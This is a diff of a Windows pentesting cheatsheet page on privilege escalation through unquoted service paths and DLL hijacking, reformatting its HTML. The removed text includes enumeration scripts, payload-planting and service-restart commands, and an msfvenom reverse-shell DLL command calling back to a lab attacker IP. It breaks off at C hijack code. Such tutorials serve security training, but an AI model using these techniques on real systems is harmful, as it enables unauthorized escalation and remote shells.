@@ -1,493 +1,104 @@
-<!DOCTYPE html>
-<html lang="en-US" dir="ltr" class="">
-<head>
-  <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>PrivEsc - DLL &amp; Unquoted Paths | JinPwn</title><meta name="description" content="Two related Windows-specific privesc surfaces. Both abuse how Windows resolves paths and loads libraries.">
-<meta name="robots" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
-<meta name="googlebot" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
-
-<link rel="canonical" href="https://jinpwn.dev/cheatsheets/windows/w05-privesc---dll--unquoted-paths/">
-<meta property="og:title" content="PrivEsc - DLL &amp; Unquoted Paths | JinPwn">
-<meta property="og:description" content="Two related Windows-specific privesc surfaces. Both abuse how Windows resolves paths and loads libraries.">
-<meta property="og:type" content="website">
-<meta property="og:url" content="https://jinpwn.dev/cheatsheets/windows/w05-privesc---dll--unquoted-paths/">
-<meta property="og:site_name" content="JinPwn">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://jinpwn.dev/images/og/og.png">
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:title" content="PrivEsc - DLL &amp; Unquoted Paths | JinPwn">
-<meta name="twitter:description" content="Two related Windows-specific privesc surfaces. Both abuse how Windows resolves paths and loads libraries.">
-<meta name="twitter:image" content="https://jinpwn.dev/images/og/og.png">
-<meta name="twitter:site" content="@jinpwn">
-<meta name="twitter:creator" content="@jinpwn">
-
-
-<script type="application/ld+json">{"@context":"https://schema.org","@type":"WebPage","description":"Two related Windows-specific privesc surfaces. Both abuse how Windows resolves paths and loads libraries.","image":["https://jinpwn.dev/images/og/og.png"],"inLanguage":"en-US","name":"PrivEsc - DLL \u0026 Unquoted Paths | JinPwn","url":"https://jinpwn.dev/cheatsheets/windows/w05-privesc---dll--unquoted-paths/"}</script>
-
-<meta name="theme-color" content="#111111">
-<link rel="icon" type="image/png" href="/favicon.png">
-
-      <link rel="stylesheet" href="/css/site.min.bbc8db26832d45b71fab2c52bea8e7468ac7f3d71458dff1936b8d5891ff48a8.css" integrity="sha256-u8jbJoMtRbcfqyxSvqjnRorH89cUWN/xk2uNWJH/SKg=" crossorigin="anonymous">
-
-
-        <script src="/js/main.e9594fc927ccbd51f2ef3a698abafb8bbf09dcc796037e0a51eedfb14ca858f4.js" integrity="sha256-6VlPySfMvVHy7zppirr7i78J3MeWA34KUe7fsUyoWPQ=" crossorigin="anonymous" defer></script>
-        <script src="/js/asm-highlight.d74879c0e3b6982d95821f5d83904fa40660a6a7e4a2442cdc4bda545679f540.js" integrity="sha256-10h5wOO2mC2Vgh9dg5BPpAZgpqfkokQs3EvaVFZ59UA=" crossorigin="anonymous" defer></script>
-
-
-</head>
-<body class="">
-  
-
-
-
-
-
-  
-  
-  
-
-
-
-  
-
-<header class="site-header">
-  <nav class="top-nav">
-    <div class="container nav-inner">
-      <div class="nav-left">
-        <a href="/" class="brand-link has-logo" aria-label="Home"><img src="/favicon.png" alt="jinpwn.dev" class="brand-logo" style="--brand-logo-height: 36px;"></a>
-        <div class="nav-links desktop-only">
-          
-    <a href="/">Posts</a>
-    <a href="/posts/">Archive</a>
-    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
-    <a href="/about/">About</a>
-
-        </div>
-      </div>
-      <div class="nav-actions">
-        <div class="search-anchor" id="search-root" data-search-root>
-          <label class="search-trigger" for="search-input">
-            <span class="search-glyph" aria-hidden="true">
-              <svg viewBox="0 0 24 24">
-                <circle cx="11" cy="11" r="7"></circle>
-                <path d="M20 20L16.65 16.65"></path>
-              </svg>
-            </span>
-            <input id="search-input" type="search" placeholder="Search..." autocomplete="off" spellcheck="false" aria-label="Search posts and cheatsheets">
-            <button type="button" class="search-clear" data-search-clear aria-label="Clear search" hidden>
-              <svg viewBox="0 0 24 24" aria-hidden="true">
-                <path d="M18 6L6 18"></path>
-                <path d="M6 6l12 12"></path>
-              </svg>
-            </button>
-            <span class="search-trigger-shortcut desktop-only" aria-hidden="true">CTRL K</span>
-          </label>
-          <div id="search-dropdown" class="search-dropdown" hidden data-search-index-url="/search-index.json" data-search-runtime-url="/js/search-flex.1b1c225e3d6a2ff08480727a5e3bf93df59715e138fede75b7616d9c75fc4fa7.js">
-  <p class="search-status" data-search-status aria-live="polite">Type to search posts and cheatsheets.</p>
-  <div class="search-results" data-search-results role="listbox" aria-label="Search results">
-    <p class="search-empty">Type to search posts and cheatsheets.</p>
-  </div>
-</div>
-
-        </div>
-        <button class="icon-button mobile-only" type="button" data-search-mobile-toggle aria-label="Search" aria-expanded="false" aria-controls="search-root">
-          <svg viewBox="0 0 24 24" aria-hidden="true">
-            <circle cx="11" cy="11" r="7"></circle>
-            <path d="M20 20L16.65 16.65"></path>
-          </svg>
-        </button>
-        <button class="icon-button mobile-only" type="button" data-mobile-toggle aria-label="Toggle menu" aria-expanded="false" aria-controls="mobile-nav">
-          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-open-icon>
-            <path d="M3 6h18"></path>
-            <path d="M3 12h18"></path>
-            <path d="M3 18h18"></path>
-          </svg>
-          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-close-icon hidden>
-            <path d="M18 6L6 18"></path>
-            <path d="M6 6l12 12"></path>
-          </svg>
-        </button>
-      </div>
-    </div>
-    <div id="mobile-nav" class="mobile-nav">
-      
-    <a href="/">Posts</a>
-    <a href="/posts/">Archive</a>
-    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
-    <a href="/about/">About</a>
-
-    </div>
-  </nav>
-</header>
-
-  
-  <main class="site-main">
-    
-  
-  
-  
-  <article class="container cheatsheet-docs-shell">
-    <div class="cheatsheet-docs-layout">
-      
-        <aside class="cheatsheet-sidebar" aria-label="Windows Pentesting navigation">
-    <div class="cheatsheet-sidebar-inner">
-      
-        <a href="/cheatsheets/" class="cheatsheet-sidebar-root">All cheatsheets</a>
-      
-      <a href="/cheatsheets/windows/" class="cheatsheet-sidebar-section">Windows Pentesting</a>
-      
-        <nav class="cheatsheet-sidebar-nav">
-          <ul class="cheatsheet-sidebar-list">
-            
-              <li>
-                <a href="/cheatsheets/windows/00-windows-moc/" class="cheatsheet-sidebar-link">Windows MOC</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/windows/w01-recon--enum/" class="cheatsheet-sidebar-link">Recon &amp; Enum</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/windows/w02-local-enum/" class="cheatsheet-sidebar-link">Local Enum</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/windows/w03-privesc---tokens--privileges/" class="cheatsheet-sidebar-link">PrivEsc - Tokens &amp; Privileges</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/windows/w04-privesc---services--registry/" class="cheatsheet-sidebar-link">PrivEsc - Services &amp; Registry</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/windows/w05-privesc---dll--unquoted-paths/" class="cheatsheet-sidebar-link is-current">PrivEsc - DLL &amp; Unquoted Paths</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/windows/w06-privesc---credentials--files/" class="cheatsheet-sidebar-link">PrivEsc - Credentials &amp; Files</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/windows/w07-uac-bypass/" class="cheatsheet-sidebar-link">UAC Bypass</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/windows/w08-privesc---kernel--exploits/" class="cheatsheet-sidebar-link">PrivEsc - Kernel &amp; Exploits</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/windows/w09-lolbas/" class="cheatsheet-sidebar-link">LOLBAS</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/windows/w10-defender--amsi-evasion/" class="cheatsheet-sidebar-link">Defender &amp; AMSI Evasion</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/windows/w11-lateral-movement/" class="cheatsheet-sidebar-link">Lateral Movement</a>
-              </li>
-            
-          </ul>
-        </nav>
-      
-    </div>
-  </aside>
-      
-      <div class="cheatsheet-docs-main cheatsheet-page-main">
-        <header class="cheatsheet-page-header">
-          <h1>PrivEsc - DLL &amp; Unquoted Paths</h1>
-          
-        </header>
-
-        
-          <details class="cheatsheet-mobile-sections">
-    <summary class="cheatsheet-mobile-sections-summary">
-      <span class="cheatsheet-mobile-sections-label">Sections</span>
-      <span class="cheatsheet-mobile-sections-current">PrivEsc - DLL &amp; Unquoted Paths</span>
-      <span class="cheatsheet-mobile-sections-caret" aria-hidden="true"></span>
-    </summary>
-    <div class="cheatsheet-mobile-sections-panel">
-      <nav aria-label="Windows Pentesting sections">
-        <ul class="cheatsheet-mobile-sections-list">
-          
-            <li>
-              <a href="/cheatsheets/" class="cheatsheet-mobile-sections-link cheatsheet-mobile-sections-root">All cheatsheets</a>
-            </li>
-          
-          <li>
-            <a href="/cheatsheets/windows/" class="cheatsheet-mobile-sections-link">Overview</a>
-          </li>
-          
-            <li>
-              <a href="/cheatsheets/windows/00-windows-moc/" class="cheatsheet-mobile-sections-link">Windows MOC</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/windows/w01-recon--enum/" class="cheatsheet-mobile-sections-link">Recon &amp; Enum</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/windows/w02-local-enum/" class="cheatsheet-mobile-sections-link">Local Enum</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/windows/w03-privesc---tokens--privileges/" class="cheatsheet-mobile-sections-link">PrivEsc - Tokens &amp; Privileges</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/windows/w04-privesc---services--registry/" class="cheatsheet-mobile-sections-link">PrivEsc - Services &amp; Registry</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/windows/w05-privesc---dll--unquoted-paths/" class="cheatsheet-mobile-sections-link is-current">PrivEsc - DLL &amp; Unquoted Paths</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/windows/w06-privesc---credentials--files/" class="cheatsheet-mobile-sections-link">PrivEsc - Credentials &amp; Files</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/windows/w07-uac-bypass/" class="cheatsheet-mobile-sections-link">UAC Bypass</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/windows/w08-privesc---kernel--exploits/" class="cheatsheet-mobile-sections-link">PrivEsc - Kernel &amp; Exploits</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/windows/w09-lolbas/" class="cheatsheet-mobile-sections-link">LOLBAS</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/windows/w10-defender--amsi-evasion/" class="cheatsheet-mobile-sections-link">Defender &amp; AMSI Evasion</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/windows/w11-lateral-movement/" class="cheatsheet-mobile-sections-link">Lateral Movement</a>
-            </li>
-          
-        </ul>
-      </nav>
-    </div>
-  </details>
-        
-
-        <div class="markdown-content cheatsheet-page-body">
-          <p>Two related Windows-specific privesc surfaces. Both abuse how Windows resolves paths and loads libraries.</p>
-<h2 id="i-unquoted-service-paths" data-heading-permalink="true"><span class="heading-content">i. Unquoted service paths</span>
-    <a class="heading-permalink" href="#i-unquoted-service-paths" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>When a service path has spaces and no quotes, Windows tries every prefix as the executable. If you can write to one of those prefixes, you win.</p>
-<p>Example service path: <code>C:\Program Files\Common Files\My App\backup.exe</code></p>
-<p>Windows tries in order:</p>
-<pre tabindex="0"><code>C:\Program.exe
+<!doctype html><html lang=en-US dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>PrivEsc - DLL & Unquoted Paths | JinPwn</title><meta name=description content="Two related Windows-specific privesc surfaces. Both abuse how Windows resolves paths and loads libraries."><meta name=robots content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1"><meta name=googlebot content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1"><link rel=canonical href=https://jinpwn.dev/cheatsheets/windows/w05-privesc---dll--unquoted-paths/><meta property="og:title" content="PrivEsc - DLL & Unquoted Paths | JinPwn"><meta property="og:description" content="Two related Windows-specific privesc surfaces. Both abuse how Windows resolves paths and loads libraries."><meta property="og:type" content="website"><meta property="og:url" content="https://jinpwn.dev/cheatsheets/windows/w05-privesc---dll--unquoted-paths/"><meta property="og:site_name" content="JinPwn"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://jinpwn.dev/images/og/og.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="PrivEsc - DLL & Unquoted Paths | JinPwn"><meta name=twitter:description content="Two related Windows-specific privesc surfaces. Both abuse how Windows resolves paths and loads libraries."><meta name=twitter:image content="https://jinpwn.dev/images/og/og.png"><meta name=twitter:site content="@jinpwn"><meta name=twitter:creator content="@jinpwn"><script type=application/ld+json>{"@context":"https://schema.org","@type":"WebPage","description":"Two related Windows-specific privesc surfaces. Both abuse how Windows resolves paths and loads libraries.","image":["https://jinpwn.dev/images/og/og.png"],"inLanguage":"en-US","name":"PrivEsc - DLL \u0026 Unquoted Paths | JinPwn","url":"https://jinpwn.dev/cheatsheets/windows/w05-privesc---dll--unquoted-paths/"}</script><meta name=theme-color content="#111111"><link rel=icon type=image/png href=/favicon.png><link rel=stylesheet href=/css/site.min.bbc8db26832d45b71fab2c52bea8e7468ac7f3d71458dff1936b8d5891ff48a8.css integrity="sha256-u8jbJoMtRbcfqyxSvqjnRorH89cUWN/xk2uNWJH/SKg=" crossorigin=anonymous><script src=/js/main.e9594fc927ccbd51f2ef3a698abafb8bbf09dcc796037e0a51eedfb14ca858f4.js integrity="sha256-6VlPySfMvVHy7zppirr7i78J3MeWA34KUe7fsUyoWPQ=" crossorigin=anonymous defer></script><script src=/js/asm-highlight.d74879c0e3b6982d95821f5d83904fa40660a6a7e4a2442cdc4bda545679f540.js integrity="sha256-10h5wOO2mC2Vgh9dg5BPpAZgpqfkokQs3EvaVFZ59UA=" crossorigin=anonymous defer></script></head><body><header class=site-header><nav class=top-nav><div class="container nav-inner"><div class=nav-left><a href=/ class="brand-link has-logo" aria-label=Home><img src=/favicon.png alt=jinpwn.dev class=brand-logo style=--brand-logo-height:36px></a><div class="nav-links desktop-only"><a href=/>Posts</a>
+<a href=/posts/>Archive</a>
+<a href=/cheatsheets/ class=is-current>Cheatsheets</a>
+<a href=/about/>About</a></div></div><div class=nav-actions><div class=search-anchor id=search-root data-search-root><label class=search-trigger for=search-input><span class=search-glyph aria-hidden=true><svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.35-3.35"/></svg>
+</span><input id=search-input type=search placeholder=Search... autocomplete=off spellcheck=false aria-label="Search posts and cheatsheets">
+<button type=button class=search-clear data-search-clear aria-label="Clear search" hidden>
+<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg>
+</button>
+<span class="search-trigger-shortcut desktop-only" aria-hidden=true>CTRL K</span></label><div id=search-dropdown class=search-dropdown hidden data-search-index-url=/search-index.json data-search-runtime-url=/js/search-flex.1b1c225e3d6a2ff08480727a5e3bf93df59715e138fede75b7616d9c75fc4fa7.js><p class=search-status data-search-status aria-live=polite>Type to search posts and cheatsheets.</p><div class=search-results data-search-results role=listbox aria-label="Search results"><p class=search-empty>Type to search posts and cheatsheets.</p></div></div></div><button class="icon-button mobile-only" type=button data-search-mobile-toggle aria-label=Search aria-expanded=false aria-controls=search-root>
+<svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.35-3.35"/></svg>
+</button>
+<button class="icon-button mobile-only" type=button data-mobile-toggle aria-label="Toggle menu" aria-expanded=false aria-controls=mobile-nav>
+<svg viewBox="0 0 24 24" aria-hidden="true" data-menu-open-icon=""><path d="M3 6h18"/><path d="M3 12h18"/><path d="M3 18h18"/></svg>
+<svg viewBox="0 0 24 24" aria-hidden="true" data-menu-close-icon="" hidden=""><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg></button></div></div><div id=mobile-nav class=mobile-nav><a href=/>Posts</a>
+<a href=/posts/>Archive</a>
+<a href=/cheatsheets/ class=is-current>Cheatsheets</a>
+<a href=/about/>About</a></div></nav></header><main class=site-main><article class="container cheatsheet-docs-shell"><div class=cheatsheet-docs-layout><aside class=cheatsheet-sidebar aria-label="Windows Pentesting navigation"><div class=cheatsheet-sidebar-inner><a href=/cheatsheets/ class=cheatsheet-sidebar-root>All cheatsheets</a>
+<a href=/cheatsheets/windows/ class=cheatsheet-sidebar-section>Windows Pentesting</a><nav class=cheatsheet-sidebar-nav><ul class=cheatsheet-sidebar-list><li><a href=/cheatsheets/windows/00-windows-moc/ class=cheatsheet-sidebar-link>Windows MOC</a></li><li><a href=/cheatsheets/windows/w01-recon--enum/ class=cheatsheet-sidebar-link>Recon & Enum</a></li><li><a href=/cheatsheets/windows/w02-local-enum/ class=cheatsheet-sidebar-link>Local Enum</a></li><li><a href=/cheatsheets/windows/w03-privesc---tokens--privileges/ class=cheatsheet-sidebar-link>PrivEsc - Tokens & Privileges</a></li><li><a href=/cheatsheets/windows/w04-privesc---services--registry/ class=cheatsheet-sidebar-link>PrivEsc - Services & Registry</a></li><li><a href=/cheatsheets/windows/w05-privesc---dll--unquoted-paths/ class="cheatsheet-sidebar-link is-current">PrivEsc - DLL & Unquoted Paths</a></li><li><a href=/cheatsheets/windows/w06-privesc---credentials--files/ class=cheatsheet-sidebar-link>PrivEsc - Credentials & Files</a></li><li><a href=/cheatsheets/windows/w07-uac-bypass/ class=cheatsheet-sidebar-link>UAC Bypass</a></li><li><a href=/cheatsheets/windows/w08-privesc---kernel--exploits/ class=cheatsheet-sidebar-link>PrivEsc - Kernel & Exploits</a></li><li><a href=/cheatsheets/windows/w09-lolbas/ class=cheatsheet-sidebar-link>LOLBAS</a></li><li><a href=/cheatsheets/windows/w10-defender--amsi-evasion/ class=cheatsheet-sidebar-link>Defender & AMSI Evasion</a></li><li><a href=/cheatsheets/windows/w11-lateral-movement/ class=cheatsheet-sidebar-link>Lateral Movement</a></li></ul></nav></div></aside><div class="cheatsheet-docs-main cheatsheet-page-main"><header class=cheatsheet-page-header><h1>PrivEsc - DLL & Unquoted Paths</h1></header><details class=cheatsheet-mobile-sections><summary class=cheatsheet-mobile-sections-summary><span class=cheatsheet-mobile-sections-label>Sections</span>
+<span class=cheatsheet-mobile-sections-current>PrivEsc - DLL & Unquoted Paths</span>
+<span class=cheatsheet-mobile-sections-caret aria-hidden=true></span></summary><div class=cheatsheet-mobile-sections-panel><nav aria-label="Windows Pentesting sections"><ul class=cheatsheet-mobile-sections-list><li><a href=/cheatsheets/ class="cheatsheet-mobile-sections-link cheatsheet-mobile-sections-root">All cheatsheets</a></li><li><a href=/cheatsheets/windows/ class=cheatsheet-mobile-sections-link>Overview</a></li><li><a href=/cheatsheets/windows/00-windows-moc/ class=cheatsheet-mobile-sections-link>Windows MOC</a></li><li><a href=/cheatsheets/windows/w01-recon--enum/ class=cheatsheet-mobile-sections-link>Recon & Enum</a></li><li><a href=/cheatsheets/windows/w02-local-enum/ class=cheatsheet-mobile-sections-link>Local Enum</a></li><li><a href=/cheatsheets/windows/w03-privesc---tokens--privileges/ class=cheatsheet-mobile-sections-link>PrivEsc - Tokens & Privileges</a></li><li><a href=/cheatsheets/windows/w04-privesc---services--registry/ class=cheatsheet-mobile-sections-link>PrivEsc - Services & Registry</a></li><li><a href=/cheatsheets/windows/w05-privesc---dll--unquoted-paths/ class="cheatsheet-mobile-sections-link is-current">PrivEsc - DLL & Unquoted Paths</a></li><li><a href=/cheatsheets/windows/w06-privesc---credentials--files/ class=cheatsheet-mobile-sections-link>PrivEsc - Credentials & Files</a></li><li><a href=/cheatsheets/windows/w07-uac-bypass/ class=cheatsheet-mobile-sections-link>UAC Bypass</a></li><li><a href=/cheatsheets/windows/w08-privesc---kernel--exploits/ class=cheatsheet-mobile-sections-link>PrivEsc - Kernel & Exploits</a></li><li><a href=/cheatsheets/windows/w09-lolbas/ class=cheatsheet-mobile-sections-link>LOLBAS</a></li><li><a href=/cheatsheets/windows/w10-defender--amsi-evasion/ class=cheatsheet-mobile-sections-link>Defender & AMSI Evasion</a></li><li><a href=/cheatsheets/windows/w11-lateral-movement/ class=cheatsheet-mobile-sections-link>Lateral Movement</a></li></ul></nav></div></details><div class="markdown-content cheatsheet-page-body"><p>Two related Windows-specific privesc surfaces. Both abuse how Windows resolves paths and loads libraries.</p><h2 id=i-unquoted-service-paths data-heading-permalink=true><span class=heading-content>i. Unquoted service paths</span>
+<a class=heading-permalink href=#i-unquoted-service-paths aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>When a service path has spaces and no quotes, Windows tries every prefix as the executable. If you can write to one of those prefixes, you win.</p><p>Example service path: <code>C:\Program Files\Common Files\My App\backup.exe</code></p><p>Windows tries in order:</p><pre tabindex=0><code>C:\Program.exe
 C:\Program Files\Common.exe
 C:\Program Files\Common Files\My.exe
 C:\Program Files\Common Files\My App\backup.exe
-</code></pre><p>If you can write to any of those prefixes, drop your payload there.</p>
-<p>Find them:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">wmic service get name,displayname,pathname,startmode <span class="p">|</span> findstr /i <span class="s2">&#34;auto&#34;</span> <span class="p">|</span> findstr /i /v <span class="s2">&#34;c:\windows\\&#34;</span> <span class="p">|</span> findstr /i /v <span class="s2">&#34;&#34;&#34;</span>
-</span></span></code></pre></div><p>PowerShell version:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-CimInstance</span> <span class="n">Win32_Service</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="nv">$_</span><span class="p">.</span><span class="py">PathName</span> <span class="o">-match</span> <span class="s1">&#39; &#39;</span> <span class="o">-and</span> <span class="nv">$_</span><span class="p">.</span><span class="py">PathName</span> <span class="o">-notmatch</span> <span class="s1">&#39;^&#34;&#39;</span> <span class="o">-and</span> <span class="nv">$_</span><span class="p">.</span><span class="py">PathName</span> <span class="o">-notmatch</span> <span class="s1">&#39;^C:\\Windows&#39;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">Name</span><span class="p">,</span><span class="n">PathName</span><span class="p">,</span><span class="n">StartMode</span>
-</span></span></code></pre></div><p>Then test write access on each candidate prefix:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$path</span> <span class="p">=</span> <span class="s2">&#34;C:\Program Files\Common Files\My App\backup.exe&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$parts</span> <span class="p">=</span> <span class="nv">$path</span> <span class="n">-split</span> <span class="s1">&#39;\\&#39;</span>
-</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="p">=</span><span class="mf">1</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">-lt</span> <span class="nv">$parts</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span> <span class="nv">$i</span><span class="p">++)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="nv">$dir</span> <span class="p">=</span> <span class="p">(</span><span class="nv">$parts</span><span class="p">[</span><span class="mf">0</span><span class="p">..(</span><span class="nv">$i</span><span class="p">-</span><span class="mf">1</span><span class="p">)]</span> <span class="n">-join</span> <span class="s1">&#39;\&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="nv">$dir</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">      <span class="nv">$f</span> <span class="p">=</span> <span class="s2">&#34;</span><span class="nv">$dir</span><span class="s2">\writetest.tmp&#34;</span>
-</span></span><span class="line"><span class="cl">      <span class="p">[</span><span class="no">io.file</span><span class="p">]::</span><span class="n">OpenWrite</span><span class="p">(</span><span class="nv">$f</span><span class="p">).</span><span class="py">Close</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl">      <span class="nb">Remove-Item</span> <span class="nv">$f</span>
-</span></span><span class="line"><span class="cl">      <span class="nb">Write-Host</span> <span class="s2">&#34;WRITABLE: </span><span class="nv">$dir</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">catch</span> <span class="p">{}</span>
-</span></span><span class="line"><span class="cl">  <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><p>Exploit by dropping a payload at the writable prefix:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl"><span class="k">copy</span> C:\Windows\Temp\sh.exe <span class="s2">&#34;C:\Program Files\Common.exe&#34;</span>
-</span></span><span class="line"><span class="cl">sc.exe stop vulnsvc <span class="p">&amp;</span> sc.exe start vulnsvc
-</span></span></code></pre></div><div class="obsidian-callout callout-warning">
-  <div class="obsidian-callout-header">
-    <div class="obsidian-callout-icon" aria-hidden="true">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"></path>
-          <path d="M12 9v4"></path>
-          <path d="M12 17h.01"></path></svg>
-    </div>
-    <span class="obsidian-callout-title">Need restart permission</span>
-  </div>
-  <div class="obsidian-callout-body">
-    <p>Unquoted path is useless if you can&rsquo;t restart the service. Check <code>sc.exe sdshow &lt;svc&gt;</code> for SERVICE_STOP rights, or wait for reboot.</p>
-  </div>
-</div>
-<h2 id="ii-dll-hijacking-the-search-order" data-heading-permalink="true"><span class="heading-content">ii. DLL hijacking, the search order</span>
-    <a class="heading-permalink" href="#ii-dll-hijacking-the-search-order" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>When a binary calls <code>LoadLibrary(&quot;foo.dll&quot;)</code> without an absolute path, Windows searches in order:</p>
-<ol>
-<li>The directory the EXE is in</li>
-<li>The current directory (CWD)</li>
-<li><code>C:\Windows\System32</code></li>
-<li><code>C:\Windows\System</code></li>
-<li><code>C:\Windows</code></li>
-<li>Directories in <code>PATH</code></li>
-</ol>
-<p>Plant <code>foo.dll</code> in any earlier-searched writable directory.</p>
-<p><code>SafeDllSearchMode</code> (default on since XP SP2) moves CWD lower in the order, but search 1 (EXE directory) always wins.</p>
-<h2 id="iii-find-dll-hijack-candidates" data-heading-permalink="true"><span class="heading-content">iii. Find DLL hijack candidates</span>
-    <a class="heading-permalink" href="#iii-find-dll-hijack-candidates" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Run Process Monitor (procmon) on a test box, filter for <code>NAME NOT FOUND</code> and <code>Path ends with .dll</code>. Each missing DLL is a candidate. On the target, repeat with the actual service.</p>
-<p>Quick script to find writable directories in PATH (planting a DLL named like a commonly-loaded one):</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$env:PATH</span> <span class="n">-split</span> <span class="s1">&#39;;&#39;</span> <span class="p">|</span> <span class="nb">ForEach-Object</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="nv">$_</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">      <span class="nv">$f</span> <span class="p">=</span> <span class="s2">&#34;</span><span class="nv">$_</span><span class="s2">\writetest.tmp&#34;</span>
-</span></span><span class="line"><span class="cl">      <span class="p">[</span><span class="no">io.file</span><span class="p">]::</span><span class="n">OpenWrite</span><span class="p">(</span><span class="nv">$f</span><span class="p">).</span><span class="py">Close</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl">      <span class="nb">Remove-Item</span> <span class="nv">$f</span>
-</span></span><span class="line"><span class="cl">      <span class="nb">Write-Host</span> <span class="s2">&#34;WRITABLE PATH dir: </span><span class="nv">$_</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">catch</span> <span class="p">{}</span>
-</span></span><span class="line"><span class="cl">  <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><h2 id="iv-build-a-hijack-dll" data-heading-permalink="true"><span class="heading-content">iv. Build a hijack DLL</span>
-    <a class="heading-permalink" href="#iv-build-a-hijack-dll" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Generate one with msfvenom:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfvenom -p windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.1 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f dll -o hijack.dll
-</span></span></code></pre></div><p>Or a minimal C source if AV chews on msfvenom:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// hijack.c, build with: x86_64-w64-mingw32-gcc hijack.c -shared -o hijack.dll
